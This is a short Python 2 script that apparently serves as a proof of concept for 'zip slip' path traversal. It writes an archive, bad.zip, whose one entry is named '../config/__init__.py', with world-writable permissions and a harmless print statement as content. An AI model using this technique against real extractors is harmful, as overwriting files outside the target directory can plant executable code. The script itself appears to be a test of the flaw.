import zipfile
z_info = zipfile.ZipInfo(r"../config/__init__.py")
z_file = zipfile.ZipFile("/home/ajin/Desktop/bad.zip", mode="w")
z_file.writestr(z_info, "print 'test'")
z_info.external_attr = 0777 << 16L
z_file.close()